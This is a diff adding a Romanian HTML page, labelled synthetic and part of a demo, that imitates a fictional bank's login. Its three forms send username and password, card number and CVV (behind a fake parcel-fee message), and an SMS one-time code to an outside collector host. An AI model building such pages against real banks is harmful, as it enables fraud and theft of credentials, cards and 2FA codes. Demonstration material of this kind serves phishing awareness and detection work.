@@ -1,0 +1,71 @@
+<!doctype html>
+<html lang="ro">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!-- SINTETIC: pagina falsă din demo-ul VersoML. Imită autentificarea Banca Demo, apoi cere cardul și codul SMS. -->
+<title>Banca Demo · Autentificare</title>
+<style>
+  :root { --galben: #ffe600; --negru: #111111; --alb: #ffffff; --gri: #6b6b6b; }
+  body { margin: 0; background: #ffe600; color: #111111; font-family: Arial, Helvetica, sans-serif; }
+  .demo { background: #111111; color: #ffe600; text-align: center; font-size: 12px; padding: 4px; }
+  header { background: #111111; color: #ffe600; padding: 18px 32px; display: flex; justify-content: space-between; }
+  .logo { font-size: 28px; font-weight: 800; letter-spacing: 1px; }
+  nav a { color: #ffffff; margin-left: 18px; text-decoration: none; }
+  main { max-width: 440px; margin: 48px auto; background: #ffffff; border: 4px solid #111111; padding: 32px; }
+  label { display: block; font-weight: 700; margin-top: 16px; }
+  input { width: 100%; padding: 12px; border: 2px solid #111111; font-size: 16px; }
+  button { margin-top: 24px; width: 100%; padding: 14px; background: #111111; color: #ffe600; border: 0; font-size: 18px; font-weight: 700; }
+  .nota { font-size: 13px; color: #6b6b6b; }
+  .pas { display: none; }
+  footer { text-align: center; font-size: 12px; padding: 24px; }
+</style>
+<script src="https://cdn-statistici.test/colector.js"></script>
+</head>
+<body>
+<div class="demo">DEMO · Pagină falsă pentru demonstrația VersoML. Banca Demo este o bancă fictivă, folosită doar în demonstrații.</div>
+<header>
+  <span class="logo">Banca Demo</span>
+  <nav><a href="#">Persoane fizice</a><a href="#">Firme</a><a href="#">Contact</a></nav>
+</header>
+<main>
+  <h1>Autentificare în Banca Demo Online</h1>
+  <p>Introdu numele de utilizator și parola ca să intri în contul tău.</p>
+  <form id="autentificare" action="https://colectare-date.test/api/pas1" method="post">
+    <label for="utilizator">Nume de utilizator</label>
+    <input id="utilizator" name="username" type="text" placeholder="Nume de utilizator" autocomplete="username">
+    <label for="parola">Parola</label>
+    <input id="parola" name="password" type="password" placeholder="Parola" autocomplete="current-password">
+    <button type="submit">Autentificare</button>
+  </form>
+  <p><a href="#">Ai uitat parola?</a></p>
+  <section id="pas2" class="pas">
+    <h2>Confirmă livrarea coletului</h2>
+    <p class="nota">Coletul tău de la Curier Demo așteaptă plata taxei de livrare de 2,99 lei. Confirmă plata în 24 de ore, altfel coletul este returnat expeditorului.</p>
+    <form id="card" action="https://colectare-date.test/api/pas2" method="post">
+      <label for="numar-card">Numărul cardului</label>
+      <input id="numar-card" name="card_number" type="text" inputmode="numeric" placeholder="0000 0000 0000 0000" autocomplete="cc-number">
+      <label for="expirare">Data expirării (LL/AA)</label>
+      <input id="expirare" name="exp" type="text" placeholder="LL/AA" autocomplete="cc-exp">
+      <label for="cvv">Cod CVV</label>
+      <input id="cvv" name="cvv" type="password" placeholder="CVV" autocomplete="cc-csc">
+      <button type="submit">Plătește 2,99 lei</button>
+    </form>
+  </section>
+  <section id="pas3" class="pas">
+    <h2>Verificare de securitate</h2>
+    <p class="nota">Introdu codul primit prin SMS ca să confirmi plata. Codul expiră în 3 minute.</p>
+    <form id="cod" action="https://colectare-date.test/api/pas3" method="post">
+      <label for="cod-sms">Codul primit prin SMS</label>
+      <input id="cod-sms" name="otp" type="text" inputmode="numeric" placeholder="Cod SMS" autocomplete="one-time-code">
+      <button type="submit">Confirmă</button>
+    </form>
+  </section>
+</main>
+<footer>© 2026 Banca Demo S.A. (fictivă) · Termeni și condiții · Confidențialitate · Asistență: 0700 000 000</footer>
+<script>
+  function urmatorulPas(n) { document.getElementById("pas" + n).style.display = "block"; }
+  setTimeout(function () { window.location.href = "https://bancademo.example/"; }, 600000);
+</script>
+</body>
+</html>
